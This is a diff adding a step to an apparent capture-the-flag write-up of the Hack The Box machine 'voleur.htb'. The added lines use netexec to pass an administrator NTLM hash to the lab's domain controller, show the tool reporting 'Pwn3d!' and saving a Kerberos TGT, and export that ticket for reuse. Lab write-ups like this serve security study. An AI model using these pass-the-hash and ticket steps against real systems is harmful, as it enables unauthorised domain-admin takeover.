@@ -678,6 +678,15 @@ voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
 I now have the administrator hash
 
 ```python
+faketime -f +8h nxc smb dc.voleur.htb -u administrator -H 'e656e07c56d831611b577b160b259ad2' -k --generate-tgt admin
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\administrator:e656e07c56d831611b577b160b259ad2 (Pwn3d!)
+SMB         dc.voleur.htb   445    dc               [+] TGT saved to: admin.ccache
+SMB         dc.voleur.htb   445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=admin.ccache
+```
+I have generated a TGT for the domain admin
 
+```python
+export KRB5CCNAME=admin.ccache
 ```
 
